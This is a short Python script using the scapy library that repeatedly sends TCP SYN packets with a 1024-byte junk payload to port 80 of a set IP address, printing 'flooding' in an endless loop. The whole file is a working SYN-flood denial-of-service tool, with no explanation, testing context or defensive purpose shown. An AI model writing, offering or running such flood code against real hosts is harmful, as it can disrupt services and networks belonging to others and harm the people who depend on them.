import scapy.all as scapy

target_ip = "192.168.1.1"
target_port = 80

ip = scapy.IP(dst=target_ip)
tcp = scapy.TCP(sport=12345, dport=target_port, flags="S")
raw = scapy.Raw(b"X"*1024)
p = ip / tcp / raw

while True:
    print("flooding")
    scapy.send(p, verbose=0)
